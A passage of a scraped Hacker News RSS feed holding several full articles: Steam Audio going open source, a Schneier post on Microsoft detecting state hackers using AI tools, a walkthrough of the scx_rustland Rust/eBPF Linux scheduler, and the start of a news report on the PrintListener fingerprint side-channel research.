<p><span>Similar efforts at other universities have emerged in recent months, including Harvard’s </span><a href="https://sites.harvard.edu/cafh/about/"><span>Council on Academic Freedom</span></a><span>, Princeton’s </span><a href="https://jmp.princeton.edu/princeton-principles-campus-culture-free-inquiry"><span>Princeton Principles for a Campus Culture of Free Inquiry</span></a><span> and the University of Pennsylvania’s </span><a href="https://pennforward.com/"><span>pennforward.com</span></a><span>.&nbsp;</span></p>
<p><span>All such efforts formally began within the last year.&nbsp;</span></p>
            
            <!-- Mini author summary at end of article -->
            
              <p><span>

                                                                                
                    <span>
                      BEN RAAB                    </span>

                                          <a href="http://twitter.com/https://twitter.com/BenHRaab">
                        <span></span>
                      </a>
                                        
                                          <span>
                        <a href="mailto:ben.raab@yale.edu">
                          <span></span>
                          <!-- <span>ben.raab@yale.edu</span> -->
                        </a>
                      </span>
                    
                                          <p>
                        Ben Raab covers faculty and academics at Yale and writes about the Yale men's basketball team. Originally from New York City, Ben is a sophomore in Pierson college pursuing a double major in history and political science.                      </p>
                    
                  </span>

              </p>

            
              <p><span>

                                                                                
                    <span>
                      BENJAMIN HERNANDEZ                    </span>

                                        
                                          <span>
                        <a href="mailto:benjamin.hernandez@yale.edu">
                          <span></span>
                          <!-- <span>benjamin.hernandez@yale.edu</span> -->
                        </a>
                      </span>
                    
                                          <p>
                        Benjamin Hernandez covers Woodbridge Hall, the President's Office. He previously reported on international affairs at Yale. Born and raised in Dallas, Texas, he is a sophomore in Trumbull College majoring in Global Affairs.                      </p>
                    
                  </span>

              </p>

                        
          </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Valve Makes All Steam Audio SDK Source Code Available Under Apache 2.0 License (222 pts)]]></title>
            <link>https://www.phoronix.com/news/Steam-Audio-SDK-Fully-Open</link>
            <guid>39443283</guid>
            <pubDate>Tue, 20 Feb 2024 16:29:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.phoronix.com/news/Steam-Audio-SDK-Fully-Open">https://www.phoronix.com/news/Steam-Audio-SDK-Fully-Open</a>, See on <a href="https://news.ycombinator.com/item?id=39443283">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p><img alt="VALVE" src="https://www.phoronix.com/assets/categories/valve.webp" width="100" height="100"></p><p>
With Valve's release today of the Steam Audio SDK 4.5.2 they have made the software development kit fully open-source under an Apache 2.0 license.
</p><p>
<a href="https://github.com/ValveSoftware/steam-audio/releases/tag/v4.5.2">Steam Audio 4.5.2</a> may not sound exciting in the context of a version number but as described in the release announcement is now "the first open source release of the Steam Audio SDK source code." The rest of this work in this Steam Audio SDK release amounts to bug fixes and other standard changes.
</p><p><img src="https://www.phoronix.net/image.php?id=2024&amp;image=steam_audio" alt="Steam Audio SDK logo"></p>
<p>In a <a href="https://steamcommunity.com/app/596420/eventcomments/4361243264663731579?snr=2_groupannouncements_detail_">SteamCommunity.com</a> announcement posted today entitled "Steam Audio Open Source Release", it notes:
</p><blockquote>"The entire Steam Audio codebase, including both the SDK and all plugins, is now released under the Apache 2.0 license. This allows developers to use Steam Audio in commercial products, and to modify or redistribute it under their own licensing terms without having to include source code. We welcome contributions from developers who would like to fix bugs or add features to Steam Audio."</blockquote>
<p>Kudos to Valve on this fully open-source Steam Audio SDK, plug-ins included. Just the latest great open-source/Linux work from Valve.
</p><p>
Steam Audio is described by Valve as an immersive audio solution for games and VR. Plug-ins exist for Unity, Unreal Engine, and other game engines. This 3D sound API is promoted as a full-featured audio solution with real-time sound propagation, VR integration, great 3D audio capabilities, and more. More background information on Steam Audio via <a href="https://valvesoftware.github.io/steam-audio/">the project site</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft Is Spying on Users of Its AI Tools (339 pts)]]></title>
            <link>https://www.schneier.com/blog/archives/2024/02/microsoft-is-spying-on-users-of-its-ai-tools.html</link>
            <guid>39442429</guid>
            <pubDate>Tue, 20 Feb 2024 15:28:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.schneier.com/blog/archives/2024/02/microsoft-is-spying-on-users-of-its-ai-tools.html">https://www.schneier.com/blog/archives/2024/02/microsoft-is-spying-on-users-of-its-ai-tools.html</a>, See on <a href="https://news.ycombinator.com/item?id=39442429">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-68456">

	<div>

		
		<p>Microsoft announced that it <a href="https://www.washingtonpost.com/technology/2024/02/14/us-adversaries-using-artificial-intelligence-boost-hacking-efforts/">caught</a> Chinese, Russian, and Iranian hackers using its AI tools—presumably coding tools—to improve their hacking abilities.</p>
<p>From their <a href="https://www.microsoft.com/en-us/security/business/security-insider/reports/cyber-signals/cyber-signals-issue-6-navigating-cyberthreats-and-strengthening-defenses/">report</a>:</p>
<blockquote><p>In collaboration with OpenAI, we are sharing threat intelligence showing detected state affiliated adversaries—tracked as Forest Blizzard, Emerald Sleet, Crimson Sandstorm, Charcoal Typhoon, and Salmon Typhoon—using LLMs to augment cyberoperations.</p></blockquote>
<p>The only way Microsoft or OpenAI would know this would be to spy on chatbot sessions. I’m sure the terms of service—if I bothered to read them—gives them that permission. And of course it’s no surprise that Microsoft and OpenAI (and, presumably, everyone else) are spying on our usage of AI, but this confirms it.</p>

		
			<p>
				<span>Tags: <a href="https://www.schneier.com/tag/artificial-intelligence/" rel="tag">artificial intelligence</a>, <a href="https://www.schneier.com/tag/cyberespionage/" rel="tag">cyberespionage</a>, <a href="https://www.schneier.com/tag/espionage/" rel="tag">espionage</a>, <a href="https://www.schneier.com/tag/microsoft/" rel="tag">Microsoft</a></span>			</p>

		
		
		<p>
			<a href="https://www.schneier.com/blog/archives/2024/02/microsoft-is-spying-on-users-of-its-ai-tools.html" rel="bookmark">Posted on February 20, 2024 at 7:02 AM</a>			•
			<a href="https://www.schneier.com/blog/archives/2024/02/microsoft-is-spying-on-users-of-its-ai-tools.html#comments">9 Comments</a>		</p>

		
	</div>

</article><p id="powered">Sidebar photo of Bruce Schneier by Joe MacInnis.</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Writing a scheduler for Linux in Rust that runs in user-space (136 pts)]]></title>
            <link>http://arighi.blogspot.com/2024/02/writing-scheduler-for-linux-in-rust.html</link>
            <guid>39442400</guid>
            <pubDate>Tue, 20 Feb 2024 15:26:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://arighi.blogspot.com/2024/02/writing-scheduler-for-linux-in-rust.html">http://arighi.blogspot.com/2024/02/writing-scheduler-for-linux-in-rust.html</a>, See on <a href="https://news.ycombinator.com/item?id=39442400">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-body-8850124366552799685" itemprop="description articleBody">
<h2 id="overview">Overview</h2>
<p>I’ve decided to start a series of blog posts to cover some details
about <code>scx_rustland</code>, my little Linux scheduler written in
Rust that runs in user-space.</p>
<p>This project started for fun over the Christmas break, mostly because
I wanted to learn more about sched-ext and I also needed some motivation
to keep practicing Rust (that I’m still learning).</p>
<p>In this series of articles I would like to focus at some
implementation details to better explains how this scheduler works.</p>
<p>A scheduler is kernel component that needs to:</p>
<ul>
<li><p>determine the order of executions of all the tasks that want to
run (<strong>ranking</strong>)</p></li>
<li><p>determine where each task needs to run (<strong>target
CPU</strong>)</p></li>
<li><p>determine for how long a task can run (<strong>time
slice</strong>)</p></li>
</ul>
<p>The main goal of this project is to prove that we can channel these
operations into a regular user-space program and still have a system
that can perform as good as using a in-kernel scheduler.</p>
<h2 id="pros-and-cons-of-a-user-space-scheduler">Pros and cons of a
user-space scheduler</h2>
<p>The most noticeable benefits of a user-space scheduler are the
following:</p>
<ul>
<li><p>Availability of a large pool of languages (e.g., Rust),
libraries, debugging and profiling tools.</p></li>
<li><p>Lower down the barrier of CPU scheduling experimentation:
implementing and testing a particular scheduling policy can be done
inside a regular user-space process, it doesn’t require rebooting into a
new kernel, in case of bugs the user-space scheduler will just crash and
sched-ext will transparently restore the default Linux
scheduler.</p></li>
</ul>
<p>Downside of a user-space scheduler:</p>
<ul>
<li><p>Overhead: even if the scheduler itself is not really a
CPU-intensive workload (unless the system is massively overloaded), the
communication between kernel and user-space is going to add some
overhead, so the goal is to try to reduce this overhead as much as
possible</p></li>
<li><p>Protection: the user-space task that implements the scheduling
policy needs some special protection, if it’s blocked (e.g., due to a
page fault), tasks can’t be scheduled. So, in order to avoid deadlocks
the user-space scheduler should never be blocked indefinitely, waiting
for some actions performed by another task (a page fault is a good
example of such “forbidden” behavior).</p></li>
</ul>
<h2 id="how-does-it-work">How does it work?</h2>
<p>First of all this scheduler has nothing to do with Rust-for-Linux
(the kernel subsystem that allows to write kernel modules in Rust).</p>
<p>In fact the Rust part of the scheduler runs 100% in user-space and
all the scheduling decisions are also done in user-space.</p>
<p>The connection with the kernel happens thanks to eBPF and sched-ext:
together they allow to channel all the scheduling events to a user-space
program, which then communicates the tasks to be executed back to the
kernel via eBPF as well.</p>
<h2 id="ebpf-component">eBPF component</h2>
<p>sched-ext is a Linux kernel feature (not upstream yet - hopefully
it’ll be upstream soon) that allows to implement a scheduler in
eBPF.</p>
<p>Basically all you have to do is to implement some callbacks and put
them in a struct <code>sched_ext_ops</code>.</p>
<p><code>scx_rustland</code> implements the following callbacks in the
<a href="https://github.com/sched-ext/scx/blob/v0.1.7/scheds/rust/scx_rustland/src/bpf/main.bpf.c">eBPF
component</a>:</p>
<pre><code>/*
 * Scheduling class declaration.
 */
SEC(".struct_ops.link")
struct sched_ext_ops rustland = {
        .select_cpu             = (void *)rustland_select_cpu,
        .enqueue                = (void *)rustland_enqueue,
        .dispatch               = (void *)rustland_dispatch,
        .running                = (void *)rustland_running,
        .stopping               = (void *)rustland_stopping,
        .update_idle            = (void *)rustland_update_idle,
        .set_cpumask            = (void *)rustland_set_cpumask,
        .cpu_release            = (void *)rustland_cpu_release,
        .init_task              = (void *)rustland_init_task,
        .exit_task              = (void *)rustland_exit_task,
        .init                   = (void *)rustland_init,
        .exit                   = (void *)rustland_exit,
        .flags                  = SCX_OPS_ENQ_LAST | SCX_OPS_KEEP_BUILTIN_IDLE,
        .timeout_ms             = 5000,
        .name                   = "rustland",
};</code></pre>
<p>The workflow is the following:</p>
<ul>
<li><code>.select_cpu()</code> implements the logic to assign a target
CPU to a task that wants to run, typically you have to decide if you
want to keep the task on the same CPU or if it needs to be migrated to a
different one (for example if the current CPU is busy); if we can find
an idle CPU at this stage there’s no reason to call the scheduler, the
task can be immediately dispatched here.</li>
</ul>
<pre><code>s32 BPF_STRUCT_OPS(rustland_select_cpu, struct task_struct *p, s32 prev_cpu,
                   u64 wake_flags)
{
        bool is_idle = false;
        s32 cpu;

        cpu = scx_bpf_select_cpu_dfl(p, prev_cpu, wake_flags, &amp;is_idle);
        if (is_idle) {
                /*
                 * Using SCX_DSQ_LOCAL ensures that the task will be executed
                 * directly on the CPU returned by this function.
                 */
                dispatch_task(p, SCX_DSQ_LOCAL, 0, 0);
                __sync_fetch_and_add(&amp;nr_kernel_dispatches, 1);
        }

        return cpu;
}</code></pre>
<p>If we can’t find an idle CPU this step will just return the
previously used CPU, that can be used as a hint for the user-space
scheduler (keeping tasks on the same CPU has multiple benefits, such as
reusing hot caches and avoid any kind migration overhead). However this
decision is not the final one, the user-space scheduler can decide to
move the task to a different CPU if needed.</p>
<p><strong>NOTE: bypassing the user-space scheduler when we can find an
idle CPU can strongly improve the responsiveness of certain “low
latency” workloads, such as gaming for example.</strong></p>
<ul>
<li><p>Once a tentative CPU has been determined for the task we enter
the <code>.enqueue()</code> callback, usually here you may decide to
store the task in a queue, tree, or any other data structure to
determine the proper order of execution of the different tasks that
require to run.</p>
<p>In rustland the <code>.enqueue()</code> callback is used to store
tasks into a BPF map <code>BPF_MAP_TYPE_QUEUE</code>
<code>queued</code>, this represents the first connection with the
user-space counter-part. Items in this queue are managed in a
producer/consumer way: the BPF part is the producer, user-space is the
consumer.</p></li>
</ul>
<pre><code>void BPF_STRUCT_OPS(rustland_enqueue, struct task_struct *p, u64 enq_flags)
{
...
        /*
         * Add tasks to the @queued list, they will be processed by the
         * user-space scheduler.
         *
         * If @queued list is full (user-space scheduler is congested) tasks
         * will be dispatched directly from the kernel (re-using their
         * previously used CPU in this case).
         */
        get_task_info(&amp;task, p, false);
        dbg_msg("enqueue: pid=%d (%s)", p-&gt;pid, p-&gt;comm);
        if (bpf_map_push_elem(&amp;queued, &amp;task, 0)) {
                sched_congested(p);
                dispatch_task(p, SHARED_DSQ, 0, enq_flags);
                __sync_fetch_and_add(&amp;nr_kernel_dispatches, 1);
                return;
        }
        __sync_fetch_and_add(&amp;nr_queued, 1);
}</code></pre>
<p>At this point it’s up to the user-space counter-part to determine the
proper order of execution of tasks and where they need to run, the
user-space has the option to maintain the CPU assignment determined by
the built-in idle selection logic or pick another CPU.</p>
<ul>
<li><p>Once the order of execution is determined tasks are then stored
to another <code>BPF_MAP_TYPE_QUEUE</code> <code>dispatched</code>,
again in a producer/consumer way, but this time the producer is the
user-space part and the consumer is the BPF part.</p></li>
<li><p>Then the workflow goes back to the BPF part. The dispatch path
operates using multiple per-CPU dispatch queues (DSQ) and a global
dispatch queue.</p>
<p>The per-CPU DSQs are used to dispatch tasks on specific CPUs, while
the global DSQ is used to dispatch tasks on the first CPU that becomes
available (usually when the user-space doesn’t specify any preference to
run the task on a particular CPU).</p>
<p>When a CPU becomes ready to dispatch tasks, the
<code>.dispatch()</code> callback is called, if there are tasks in the
<code>dispatched</code> queue they will be bounced to the target CPU’s
queue (DSQ), or to the global dispatch queue, based on the user-space
scheduler’s decision.</p>
<pre><code>void BPF_STRUCT_OPS(rustland_dispatch, s32 cpu, struct task_struct *prev)
{
     /*
      * Check if the user-space scheduler needs to run, and in that case try
      * to dispatch it immediately.
      */
     dispatch_user_scheduler();

     /*
      * Consume all tasks from the @dispatched list and immediately try to
      * dispatch them on their target CPU selected by the user-space
      * scheduler (at this point the proper ordering has been already
      * determined by the scheduler).
      */
     bpf_repeat(MAX_ENQUEUED_TASKS) {
             struct task_struct *p;
             struct dispatched_task_ctx task;

             /*
              * Pop first task from the dispatched queue, stop if dispatch
              * queue is empty.
              */
             if (bpf_map_pop_elem(&amp;dispatched, &amp;task))
                     break;

             /* Ignore entry if the task doesn't exist anymore */
             p = bpf_task_from_pid(task.pid);
             if (!p)
                     continue;
             /*
              * Check whether the user-space scheduler assigned a different
              * CPU to the task and migrate (if possible).
              *
              * If no CPU has been specified (task.cpu &lt; 0), then dispatch
              * the task to the shared DSQ and rely on the built-in idle CPU
              * selection.
              */
             dbg_msg("usersched: pid=%d cpu=%d cpumask_cnt=%llu payload=%llu",
                     task.pid, task.cpu, task.cpumask_cnt, task.payload);
             if (task.cpu &lt; 0)
                     dispatch_task(p, SHARED_DSQ, 0, 0);
             else
                     dispatch_task(p, cpu_to_dsq(task.cpu), task.cpumask_cnt, 0);
             bpf_task_release(p);
             __sync_fetch_and_add(&amp;nr_user_dispatches, 1);
     }

     /* Consume all tasks enqueued in the current CPU's DSQ first */
     bpf_repeat(MAX_ENQUEUED_TASKS) {
             if (!scx_bpf_consume(cpu_to_dsq(cpu)))
                     break;
     }

     /* Consume all tasks enqueued in the shared DSQ */
     bpf_repeat(MAX_ENQUEUED_TASKS) {
             if (!scx_bpf_consume(SHARED_DSQ))
                     break;
     }
}</code></pre></li>
<li><p>The <code>.running()</code> and <code>.stopping()</code> callback
are called respectively when a task starts its execution on a CPU and it
releases the CPU; rustland uses this information to keep track of the
CPUs that are idle or busy, sharing this information to the user-space
counter-part (via the <code>cpu_mapcpu_map</code> BPF map
array).</p></li>
</ul>
<pre><code>/*
 * Task @p starts on its selected CPU (update CPU ownership map).
 */
void BPF_STRUCT_OPS(rustland_running, struct task_struct *p)
{
        s32 cpu = scx_bpf_task_cpu(p);

        dbg_msg("start: pid=%d (%s) cpu=%ld", p-&gt;pid, p-&gt;comm, cpu);
        /*
         * Mark the CPU as busy by setting the pid as owner (ignoring the
         * user-space scheduler).
         */
        if (!is_usersched_task(p))
                set_cpu_owner(cpu, p-&gt;pid);
}

/*
 * Task @p stops running on its associated CPU (update CPU ownership map).
 */
void BPF_STRUCT_OPS(rustland_stopping, struct task_struct *p, bool runnable)
{
        s32 cpu = scx_bpf_task_cpu(p);

        dbg_msg("stop: pid=%d (%s) cpu=%ld", p-&gt;pid, p-&gt;comm, cpu);
        /*
         * Mark the CPU as idle by setting the owner to 0.
         */
        if (!is_usersched_task(p)) {
                set_cpu_owner(scx_bpf_task_cpu(p), 0);
                /*
                 * Kick the user-space scheduler immediately when a task
                 * releases a CPU and speculate on the fact that most of the
                 * time there is another task ready to run.
                 */
                set_usersched_needed();
        }
}</code></pre>
<ul>
<li>Both the <code>.stopping()</code> and <code>.update_idle()</code>
callbacks are used as checkpoints to wake-up the user-space scheduler
(being the scheduler a regular user-space task, it needs to implement a
logic to schedule itself).</li>
</ul>
<pre><code>void BPF_STRUCT_OPS(rustland_update_idle, s32 cpu, bool idle)
{
        /*
         * Don't do anything if we exit from and idle state, a CPU owner will
         * be assigned in .running().
         */
        if (!idle)
                return;
        /*
         * A CPU is now available, notify the user-space scheduler that tasks
         * can be dispatched.
         */
        if (usersched_has_pending_tasks()) {
                set_usersched_needed();
                /*
                 * Wake up the idle CPU, so that it can immediately accept
                 * dispatched tasks.
                 */
                scx_bpf_kick_cpu(cpu, 0);
        }
}
</code></pre>
<p>There is also a periodic heartbeat timer that kicks the user-space
scheduler to prevent triggering the sched-ext watchdog when the system
is almost idle (since in this condition we won’t hit any of the wake-up
point).</p>
<pre><code>static int usersched_timer_fn(void *map, int *key, struct bpf_timer *timer)
{
        int err = 0;

        /* Kick the scheduler */
        set_usersched_needed();

        /* Re-arm the timer */
        err = bpf_timer_start(timer, NSEC_PER_SEC, 0);
        if (err)
                scx_bpf_error("Failed to arm stats timer");

        return 0;
}</code></pre>
<ul>
<li>lastly the <code>.set_cpumask()</code> is used to detect when a task
changes its affinity; the scheduler will try to honor the affinity
looking at the cpumask (we check the validity of the cpumask using a
generation number, that is incremented every time the
<code>.set_cpumask()</code> callback is executed).</li>
</ul>
<pre><code>void BPF_STRUCT_OPS(rustland_set_cpumask, struct task_struct *p,
                    const struct cpumask *cpumask)
{
        struct task_ctx *tctx;

        tctx = lookup_task_ctx(p);
        if (!tctx)
                return;
        tctx-&gt;cpumask_cnt++;
}</code></pre>
<h2 id="user-space-component-rust">User-space component (Rust)</h2>
<p>The user-space part is fully implemented in Rust as a regular
user-space program. The address space is shared with the eBPF part, so
some variables can be accessed and modified directly, while the
communication of tasks happen using the <code>bpf()</code> syscall,
accessing the <code>queued</code> and <code>dispatched</code> maps.</p>
<p><strong>NOTE: we could make this part more efficient by using eBPF
ring buffers, this would allow direct access to the maps without using a
syscall (there’s an ongoing work on this - patches are welcome if you
want to contribute).</strong></p>
<p>The user-space part is made of four components:</p>
<ul>
<li><p><a href="https://github.com/sched-ext/scx/blob/v0.1.7/scheds/rust/scx_rustland/src/bpf.rs">eBPF
abstraction layer</a>: this part implements some Rust abstractions to
hide the internal eBPF details, so that the scheduler itself can be
implemented in a more abstracted and understandable way, focusing only
at the details of the implemented scheduling policy.</p></li>
<li><p>A custom memory allocator <a href="https://github.com/sched-ext/scx/blob/v0.1.7/scheds/rust/scx_rustland/src/bpf/alloc.rs">RustLandAllocator</a>:
as mentioned in the pros and cons section, if the user-space scheduler
is blocked on a page fault, no other task can be scheduled, but we may
need to schedule some kernel threads to resolve the page fault, hence
the deadlock. To prevent this condition, the user-space scheduler locks
all the memory, via <code>mlockall()</code>, and it uses a custom memory
allocator that operates on a pre-allocated memory area. Quite tricky,
but this allows to prevent page faults in the user-space scheduler
task.</p></li>
<li><p>A <a href="https://github.com/sched-ext/scx/blob/v0.1.7/scheds/rust/scx_rustland/src/topology.rs">CPU
topology abstraction</a>: simple library to detect the current system
CPU topology (this part will be improved in the future and moved to a
more generic place, so that other schedulers may benefit from
it).</p></li>
<li><p>The <a href="https://github.com/sched-ext/scx/blob/v0.1.7/scheds/rust/scx_rustland/src/main.rs">scheduling
policy</a> itself, implemented in a totally abstracted way: the
scheduler uses a simple vruntime-based policy (similar to CFS) with a
little trick to detect interactive tasks and boost their priority a
little more (the trick is to look at the number of voluntary context
switches to determine if a task is interactive or not: a task that
releases the CPU without using its full assigned time slice is likely to
be interactive).</p>
<p>All tasks are stored in a <a href="https://github.com/sched-ext/scx/blob/v0.1.7/scheds/rust/scx_rustland/src/main.rs#L184">BTreeSet</a>
ordered by their weighted vruntime and dispatched on the CPUs selected
by the sched-ext built-in idle selection logic (unless their assigned
CPU becomes busy and in this case the task will be dispatched on the
first CPU that becomes available).</p>
<p>For the time slice assigned to each task the scheduler uses a
variable time slice approach: it starts with a fixed time slice (20ms),
that is scaled down based on the amount of tasks waiting to be scheduled
(the more the system becomes overloaded, the shorter the assigned time
slice becomes; this can help to reduce the average wait time, making the
system more responsive when it is overloaded).</p></li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>That’s all for now, the goal of this post (probably the first one of
multiple series) is to give an idea how the scheduler works.</p>
<p>The scheduler is still under development, but some early results are
very <a href="https://www.youtube.com/watch?v=oCfVbz9jvVQ">promising</a>.</p>
<p><strong>NOTE: keep in mind that in this video the scheduler was still
in an early stage, since then it has been improved a lot in terms of
stability, robustness and performance.</strong></p>
<p>In the next post I will cover more technical details, mentioning some
open issues and plans for future development and improvements.</p>
<p>I’m also planning to run more benchmarks with this scheduler (using
the <a href="https://www.phoronix-test-suite.com/">Phoronix test
suite</a>) and share some results, so stay tuned!</p>
<h2 id="references">References</h2>
<ul>
<li><p><a href="https://github.com/sched-ext/sched_ext">sched-ext
kernel</a></p></li>
<li><p><a href="https://github.com/sched-ext/scx">sched-ext schedulers
and tools</a></p></li>
<li><p><a href="https://github.com/sched-ext/scx/tree/main/scheds/rust/scx_rustland">scx_rustland
source code</a></p></li>
</ul>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Fingerprints can be recreated from the sounds made when you swipe a screen (116 pts)]]></title>
            <link>https://www.tomshardware.com/tech-industry/cyber-security/your-fingerprints-can-be-recreated-from-the-sounds-made-when-you-swipe-on-a-touchscreen-researchers-new-side-channel-attack-can-reproduce-partial-fingerprints-to-enable-attacks</link>
            <guid>39442298</guid>
            <pubDate>Tue, 20 Feb 2024 15:18:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.tomshardware.com/tech-industry/cyber-security/your-fingerprints-can-be-recreated-from-the-sounds-made-when-you-swipe-on-a-touchscreen-researchers-new-side-channel-attack-can-reproduce-partial-fingerprints-to-enable-attacks">https://www.tomshardware.com/tech-industry/cyber-security/your-fingerprints-can-be-recreated-from-the-sounds-made-when-you-swipe-on-a-touchscreen-researchers-new-side-channel-attack-can-reproduce-partial-fingerprints-to-enable-attacks</a>, See on <a href="https://news.ycombinator.com/item?id=39442298">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-widget-type="contentparsed" id="content">

<section>
<div itemprop="image" itemscope="" itemtype="https://schema.org/ImageObject">
<div>
<picture><source type="image/webp" alt="Fingerprint security" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-1920-80.jpg.webp 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW.jpg"><source type="image/jpeg" alt="Fingerprint security" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-1920-80.jpg 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW.jpg"><img src="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-320-80.jpg" alt="Fingerprint security" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW-1920-80.jpg 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW.jpg"></picture>
</div>
<meta itemprop="url" content="https://cdn.mos.cms.futurecdn.net/rGcgjNWSsvZvXWrgQU7WqW.jpg">
<meta itemprop="height" content="600">
<meta itemprop="width" content="338">
<figcaption itemprop="caption description">
<span itemprop="copyrightHolder">(Image credit: Pexels)</span>
</figcaption>
</div>

<div id="article-body">
<p>An interesting new attack on biometric <a data-analytics-id="inline-link" href="https://www.tomshardware.com/tag/security" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.tomshardware.com/tag/security">security</a> has been outlined by a group of researchers from China and the US. <a data-analytics-id="inline-link" href="https://www.ndss-symposium.org/wp-content/uploads/2024-618-paper.pdf" data-url="https://www.ndss-symposium.org/wp-content/uploads/2024-618-paper.pdf">PrintListener: Uncovering the Vulnerability of Fingerprint Authentication via the Finger Friction Sound</a> [PDF] proposes a side-channel attack on the sophisticated Automatic Fingerprint Identification System (<a data-analytics-id="inline-link" href="https://www.aratek.co/news/automated-fingerprint-identification-system-afis-an-overview" data-url="https://www.aratek.co/news/automated-fingerprint-identification-system-afis-an-overview">AFIS</a>). The attack leverages the sound characteristics of a user’s finger swiping on a <a data-analytics-id="inline-link" href="https://www.tomshardware.com/news/nokia-lumia-iphone-ipad-touchscreen,16351.html" data-before-rewrite-localise="https://www.tomshardware.com/news/nokia-lumia-iphone-ipad-touchscreen,16351.html">touchscreen</a> to extract fingerprint pattern features. Following tests, the researchers assert that they can successfully attack “up to 27.9% of partial fingerprints and 9.3% of complete fingerprints within five attempts at the highest security FAR [False Acceptance Rate] setting of 0.01%.” This is claimed to be the first work that leverages swiping sounds to infer fingerprint information.</p><p><a data-analytics-id="inline-link" href="https://www.tomshardware.com/news/raspberry-pi-pico-bank-locker" data-before-rewrite-localise="https://www.tomshardware.com/news/raspberry-pi-pico-bank-locker">Biometric fingerprint security</a> is widespread and widely trusted. If things continue as they are, it is thought that the fingerprint authentication market will be worth nearly $100 billion by 2032. However, organizations and people have become increasingly aware that attackers might want to steal their fingerprints, so some have started to be careful about keeping their fingerprints out of sight, and become sensitive to photos showing their hand details.</p><p>Without contact prints or finger detail photos, how can an attacker hope to get any fingerprint data to enhance MasterPrint and DeepMasterPrint dictionary attack results on user fingerprints? One answer is as follows: the PrintListener paper says that “finger-swiping friction sounds can be captured by attackers online with a high possibility.” The source of the finger-swiping sounds can be popular apps like <a data-analytics-id="inline-link" href="https://www.tomshardware.com/news/discord-throttles-nvidia-gpu-memory-clock-speeds" data-before-rewrite-localise="https://www.tomshardware.com/news/discord-throttles-nvidia-gpu-memory-clock-speeds">Discord</a>, Skype, WeChat, <a data-analytics-id="inline-link" href="https://www.tomshardware.com/news/apple-facetime-glitch-bug-eavesdropping-lawsuit,38527.html" data-before-rewrite-localise="https://www.tomshardware.com/news/apple-facetime-glitch-bug-eavesdropping-lawsuit,38527.html">FaceTime</a>, etc. Any chatty app where users carelessly perform swiping actions on the screen while the device mic is live. Hence the side-channel attack name – PrintListener.</p><p>There 